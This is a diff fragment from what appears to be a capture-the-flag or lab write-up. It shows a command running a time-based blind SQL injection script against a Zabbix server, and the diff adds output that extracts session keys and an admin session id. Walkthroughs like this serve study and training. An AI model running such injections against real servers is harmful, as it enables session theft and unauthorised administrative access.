@@ -209,5 +209,9 @@ Now i can exploit this
 ```python
 python3 zabbix_server_time_based_blind_sqli.py --ip zabbix.watcher.vl --sid 769725bb8e582ce30f3d2a3575da191d --hostid 10084 | grep '(+)'
 
+...[SNIP]...
 
+(+) session_key=b9857bc76e26cf108766043dbf43544b
+(+) config session_key=b9857bc76e26cf108766043dbf43544b
+(+) Extracting admin session_id...
 ```
